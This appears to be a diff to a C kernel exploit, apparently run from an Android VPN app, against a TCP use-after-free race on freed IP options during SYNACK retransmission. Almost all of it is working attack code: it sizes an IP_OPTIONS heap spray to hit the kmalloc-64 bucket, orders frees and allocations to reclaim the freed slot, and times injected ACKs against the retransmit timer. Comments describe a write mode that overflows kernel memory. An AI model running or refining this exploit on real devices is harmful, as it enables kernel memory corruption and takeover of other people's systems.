@@ -105,7 +105,9 @@ static uint32_t g_dst;
  * 0x0a070763 展开是 99.7.7.10（错的），10.7.7.99 是 0x6307070a。 */
 static uint32_t g_src = 0x6307070a; /* 10.7.7.99 */
 static uint16_t g_port = 47777;
-static int g_rounds = 4000;
+/* 每轮要等一次 SYNACK 重传定时器（约 1 秒），所以轮数不能照旧设 4000。
+ * 300 轮约 6 分钟，足够覆盖；真机调试也不至于等到失去耐心。 */
+static int g_rounds = 300;
 /* Kotlin 侧建好并绑到 VPN 网络的监听 fd；-1 表示没有，自己建。 */
 static int g_listen_fd_in = -1;
 /* 是否真的写内核；当前硬关闭，只在 --allow-write 且后续放开后才为 1。 */
@@ -395,16 +397,32 @@ static pthread_t g_spray_thread;
 /* 标记里的“代”：喷射线程每轮 +1，回读时能看出对象是哪一代的。 */
 static volatile uint32_t g_spray_gen;
 
+/* 喷淋对象长度必须和漏洞对象落在同一个 kmalloc 桶。
+ *
+ * 两条路径的分配公式不一样，这是最容易搞错的地方：
+ *   · 漏洞对象（tcp_v4_save_options，反汇编 tcp_conn_request+0x4ac）
+ *         size = optlen + 12
+ *     SYN 带 40 字节选项 → 52 → **kmalloc-64**；
+ *   · 喷淋对象（setsockopt(IP_OPTIONS) → ip_options_get，+0x50）
+ *         size = 0x20 + align4(optlen)
+ *     用 40 字节 → 0x20+40 = 72 → **kmalloc-96**，差一个桶，撞不上；
+ *     用 24 字节 → 0x20+24 = 56 → kmalloc-64 ✅。
+ *
+ * 顺带解决命中判定：喷淋对象的 optlen 字段就是选项长度本身，
+ * 用 24 而不是 40，回来的 SYNACK 长度一旦是 24 附近就说明槽位被占住了。 */
+#define SPRAY_OPTLEN   24
+
 static int spray_alloc(uint32_t tag) {
-    uint8_t opts[OPT_MAXLEN];
+    uint8_t opts[SPRAY_OPTLEN];
     memset(opts, 0, sizeof(opts));
-    /* 喷淋对象固定用 RR：命中判定靠 opts[3] 的标记，和 SYN 用哪种选项无关。 */
-    build_opts_kind(opts, OPT_MAXLEN, tag, OPT_KIND_RR);
+    /* 用 NOP 填充：不需要 RR 的指针语义，也避免内核往选项里写地址。
+     * 长度 24 满足 RR 的 IPOPT_RR = 3 + 4n 约束（23 也行，但 24 更整）。 */
+    build_opts_kind(opts, SPRAY_OPTLEN, tag, OPT_KIND_NOP);
     int made = 0;
     for (int i = 0; i < SPRAY_SOCKS; i++) {
         int fd = socket(AF_INET, SOCK_DGRAM, 0);
         if (fd < 0) break;
-        if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, OPT_MAXLEN) < 0) {
+        if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, SPRAY_OPTLEN) < 0) {
             close(fd);
             continue;
         }
@@ -509,8 +527,14 @@ static void *spray_worker(void *arg) {
             key_spray_release_half();
             key_spray(g_fake_optlen, 0x53570000u | (gen & 0xffff));
         } else {
-            spray_alloc(0x53500000u | (gen & 0xffff));
+            /* IP_OPTIONS 这条：先放掉上一批，再立刻补新的。
+             *
+             * 顺序必须是「先释放、后分配」——只有刚被放掉的槽位才可能
+             * 被内核那个 kfree 出来的洞顶替。反过来先分配的话，新对象
+             * 落在别的空槽里，那个洞仍然空着，等于白喷一轮。
+             * 释放和分配之间只隔一次 setsockopt 循环，间隔在微秒级。 */
             spray_free();
+            spray_alloc(0x53500000u | (gen & 0xffff));
         }
         usleep(100);
     }
@@ -1394,45 +1418,42 @@ static int drain_for(uint16_t sport, struct synack *out, int max) {
  * 上游修复是把这两处 kfree 改成 kfree_rcu，正是承认“读者在 RCU 里、写者
  * 直接 kfree”这件事本身不成立 —— 所以只要 kfree 落在读侧 load 之后、memcpy
  * 之前，就是一次 UAF 读。 */
-/* 一个来回的「释放 + 读」微序列，重复 RACE_BURST 次。
+/* 竞态：按「SYN → 等约 1 秒 → ACK」的时序构造。
  *
- * 为什么不用两个线程 + barrier 去"同时"发：pthread_create 本身就要几十
- * 微秒，barrier 唤醒再排队，实际到达时间差比 UAF 窗口（亚微秒级）大几个
- * 数量级，根本撞不上。改成单线程紧凑连发，包与包之间只隔一条 sendto，
- * 时序反而更紧、更可控。
+ * 之前是发完 SYN 立刻连发 RST/ACK，那时请求 sock 还好好活着，
+ * tcp_v4_syn_recv_sock 正常走完，根本不存在竞态 —— hit 恒为 0 的真正
+ * 原因是时机完全错开，不是喷淋不够快。
  *
- * 每次循环的顺序是 ACK → RST → SYN：
- *   · ACK 完成握手，req 被移出队列并释放（ireq_opt 跟着 kfree）；
- *   · RST 补刀，确保 req 一定被回收；
- *   · SYN 立刻进来，在 RCU 哈希里可能还查得到那个刚被释放的 req，
- *     于是 tcp_v4_send_synack 读到已回收的 ireq_opt —— 这就是窗口。
- * 顺序不能反：SYN 必须在释放之后，否则读到的是还活着的对象。 */
-#define RACE_BURST 12
+ * 正确的窗口来自 SYNACK 重传定时器：
+ *   ① SYN 到达，内核建请求 sock、回 SYNACK，并挂上重传定时器；
+ *   ② 我们不发第三次握手，定时器约 1 秒后到期，在 **hrtimer 软中断**
+ *      上下文里重新走 tcp_v4_send_synack → inet_csk_route_req 取 ireq_opt，
+ *      一路到 ip_options_build 末尾才真正 memcpy；
+ *   ③ 同一时刻我们注入 ACK，走 tcp_v4_syn_recv_sock 把 ireq_opt 交给
+ *      子 socket 并把 req 上的指针置空；子 socket 被 accept 侧立即 close，
+ *      inet_sock_destruct 以裸 kfree 释放该对象。
+ *
+ * 关键是 ② 在软中断上下文、③ 在进程上下文，天然落在不同 CPU 上 ——
+ * 同一个线程连发永远做不到跨核，这也是之前怎么调都撞不上的原因。
+ *
+ * 时间要贴着定时器到期点打：太早定时器没起来，太晚重传已经做完。
+ * 所以在 t0+900ms 起密集补 ACK，把整个到期窗口扫一遍。 */
 static void race_burst(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
-    uint8_t ack[128], rst[128], rtx[128];
+    uint8_t ack[128];
     size_t al = build_pkt(ack, sport, isn + 1, peer_seq + 1, 0x10);
-    size_t rl = build_pkt(rst, sport, isn + 1, peer_seq + 1, 0x04);
-    size_t tl = build_pkt(rtx, sport, isn, 0, 0x02);
+    (void)peer_seq;
 
-    /* 先 RST 再 ACK —— 顺序是这轮改的关键。
+    /* 等重传定时器就位。SYN 重传用 TCP_TIMEOUT_INIT，约 1 秒。 */
+    usleep(880 * 1000);
+
+    /* 在到期点附近密集注入 ACK：每 1ms 一个，持续 240ms。
      *
-     * 之前是 ACK 在前，结果 ireq_opt 永远走不到释放：
-     *   tcp_v4_syn_recv_sock 在 +0x100 读到 ireq_opt，把它移交给 child
-     *   socket，然后立刻 str xzr, [req, #0x100] 置空（反汇编 0xed11b0）。
-     *   req 随后被回收，析构函数看到的是 NULL，kfree 不执行。
-     *   于是 kfree 从未发生，喷淋再准也没有可占的槽位 —— 这正是
-     *   hit 和 clear 双双为 0 的原因。
-     *
-     * 反过来先发 RST：req 还停在 SYN_RECV 队列里就被销毁，
-     * tcp_v4_reqsk_destructor 直接 kfree(req->ireq_opt)，槽位真正空出来。
-     * 紧接着的 SYN 让内核再建一个 req 并发 SYNACK，而哈希里可能还留着
-     * 刚被释放的那条 —— 读到的就是已回收的 ireq_opt。
-     *
-     * ACK 仍然保留在后面：它能补掉那些 RST 没打中的 req，避免队列堆积。 */
-    for (int i = 0; i < RACE_BURST; i++) {
-        tx(rst, rl);
-        tx(rtx, tl);
+     * 覆盖 t0+880ms 到 t0+1120ms 这一段 —— 定时器实际到期点会因调度抖动
+     * 落在这个区间内，扫一遍比精确等待稳。窗口再长收益不大，因为定时器
+     * 只触发一次；再短则可能整个错过。 */
+    for (int i = 0; i < 240; i++) {
         tx(ack, al);
+        usleep(1000);
     }
 }
 
@@ -1549,36 +1570,28 @@ static int phase_race(struct hit_ctx *hit) {
     int found = 0;
     int blind = 0;
 
-    /* 喷淋源必须是 add_key，不能是 IP_OPTIONS。
+    /* 用 IP_OPTIONS 喷淋，长度 24。
      *
-     * 两者的对象大小差了整整一个桶：
-     *   · 漏洞对象 ireq_opt = optlen + 12 = 52 → kmalloc-64；
-     *   · setsockopt(IP_OPTIONS, 40) 走 ip_options_get，分配
-     *     0x20 + align4(40) = 72 → **kmalloc-96**，根本不在同一个桶里；
-     *   · add_key(user) datalen=40 分配 0x18 + 40 = 64 → kmalloc-64 ✅。
+     * 之前失败是因为用 40 字节：ip_options_get 分配 0x20+40 = 72，
+     * 落在 kmalloc-96，而漏洞对象是 optlen+12 = 52，在 kmalloc-64，
+     * 差一个桶，喷得再勤也占不到。改成 24 字节后 0x20+24 = 56，
+     * 和漏洞对象同桶。
      *
-     * 之前一直用 SPRAY_IPOPT 跑竞态，喷得再勤也占不到 ireq_opt 的槽位，
-     * 所以 hit/clear 双双为 0 —— 不是时序问题，是对象压根不在同一个 slab。 */
-    if (g_spray_kind != SPRAY_KEY) {
-        say("[spray] 切到 add_key（%d 字节，kmalloc-64）；IP_OPTIONS 走的是 kmalloc-96，撞不上",
-            0x18 + KEY_DATALEN);
-        g_spray_kind = SPRAY_KEY;
-    }
-    /* 喷淋对象里的 optlen 必须和正常值不同，否则占住了也认不出来。
+     * 用 IP_OPTIONS 而不是 add_key 还有个好处：喷出来的对象就是真正的
+     * ip_options_rcu，布局和漏洞对象逐字节一致（+0x18 optlen、+0x20 __data），
+     * 不用再靠估算去凑偏移。 */
+    g_spray_kind = SPRAY_IPOPT;
+    say("[spray] IP_OPTIONS %d 字节 → 分配 %d → kmalloc-64（漏洞对象 optlen+12=%d）",
+        SPRAY_OPTLEN, 0x20 + SPRAY_OPTLEN, g_optlen + 12);
+    /* IP_OPTIONS 喷出来的对象，optlen 字段就是选项长度 24，不需要额外写。
      *
-     * 命中判据是「回来的 optlen != 发出去的 40」。g_fake_optlen 默认就是
-     * 40，即使槽位被我们的对象占住、读到的也是 40，判据恒假 ——
-     * 这是 hit 一直为 0 的另一个独立原因。
-     *
-     * 探测阶段刻意用 **8** 而不是 56：8 比 40 小，ip_build_and_send_pkt
-     * 第二次读拿到 8 时 memcpy 只拷 8 字节，落在 skb_push 已预留的头部里，
-     * 不会越界写内核。这样能安全地验证「槽位到底能不能被占住」；
-     * 真正要写的时候（--allow-write）再换成 56 制造溢出。 */
-    g_fake_optlen = g_allow_write ? WRITE_OPTLEN : PROBE_OPTLEN;
-    say("[spray] 假 optlen = %u（正常 %d；%s）",
-        g_fake_optlen, g_optlen,
-        g_allow_write ? "写入模式，会越界" : "探测模式，只验证复用、不越界");
-    say("开始竞态：喷淋 %d 个 key/轮，最多 %d 轮", KEY_SPRAY_N, g_rounds);
+     * 这正好满足命中判据「回来的长度 != 发出去的 40」：24 和 40 差得远，
+     * 一眼能认出来。之前用 add_key 时 g_fake_optlen 默认等于 40，
+     * 判据恒假，是 hit 一直为 0 的另一个独立原因。 */
+    say("[spray] 命中判据：回来的选项长度 != %d（喷淋对象是 %d）",
+        g_optlen, SPRAY_OPTLEN);
+    say("开始竞态：喷淋 %d 个 IP_OPTIONS/轮，最多 %d 轮（每轮等一次重传定时器）",
+        SPRAY_SOCKS, g_rounds);
     spray_start();
     for (int r = 0; r < g_rounds && !found; r++) {
         uint16_t sport;
@@ -1632,8 +1645,8 @@ static int phase_race(struct hit_ctx *hit) {
          * tcp_v4_send_synack → inet_csk_route_req → ip_build_and_send_pkt
          * 这条路径，而它只在「同一个四元组又收到 SYN」时才走。
          * 不发重传 SYN，就永远没有第二次读，喷淋再准也看不到效果。 */
+        /* race_burst 内部已经等过重传定时器并扫完窗口，这里不再额外 sleep。 */
         race_burst(sport, isn, s.seq);
-        usleep(1200);
         listen_drain();
 
         /* 重传那条路径的 SYNACK 带的是本轮 sport，必须在这里收，不能等下一轮。 */
